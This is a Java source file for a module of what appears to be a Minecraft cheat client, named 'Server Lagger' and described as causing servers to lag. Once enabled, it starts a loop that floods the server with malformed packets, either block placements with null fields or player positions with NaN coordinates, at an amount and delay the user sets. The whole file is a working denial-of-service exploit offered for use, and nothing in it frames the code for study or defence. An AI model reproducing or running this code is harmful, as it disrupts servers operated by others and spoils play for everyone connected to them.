package wtf.bhopper.nonsense.module.impl.exploit;

import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C08PacketPlayerBlockPlacement;
import net.minecraft.util.BlockPos;
import wtf.bhopper.nonsense.module.Module;
import wtf.bhopper.nonsense.module.setting.impl.EnumSetting;
import wtf.bhopper.nonsense.module.setting.impl.IntSetting;
import wtf.bhopper.nonsense.util.minecraft.client.PacketUtil;

public class ServerLagger extends Module {

    private final EnumSetting<Mode> mode = new EnumSetting<>("Mode", "Mode", Mode.INTERACT);
    private final IntSetting delay = new IntSetting("Delay", "Delay between packet sends", 1, 5000, 100, "%dms", null);
    private final IntSetting amount = new IntSetting("Amount", "Amount of packets sent", 1, 1000, 5);

    private final Thread lagThread = new Thread(this::lag);

    public ServerLagger() {
        super("Server Lagger", "Causes servers to lag", Category.EXPLOIT);
        this.addSettings(mode, delay, amount);
    }

    @Override
    public void onEnable() {
        this.lagThread.start();
    }

    @Override
    public void onDisable() {
        this.lagThread.interrupt();
    }

    private void lag() {
        try {
            while (true) {
                for (int i = 0; i < this.amount.get(); i++) {
                    switch (this.mode.get()) {
                        case INTERACT:
                            PacketUtil.send(new C08PacketPlayerBlockPlacement(BlockPos.ORIGIN, 0, null, 0.0F, 0.0F, 0.0F));
                            break;

                        case INVALID_POSITION:
                            PacketUtil.send(new C03PacketPlayer.C04PacketPlayerPosition(Double.NaN, Double.NaN, Double.NaN, false));
                            break;
                    }
                }
                Thread.sleep(this.delay.get());
            }
        } catch (Exception ignored) {}
    }

    enum Mode {
        INTERACT,
        INVALID_POSITION
    }

}
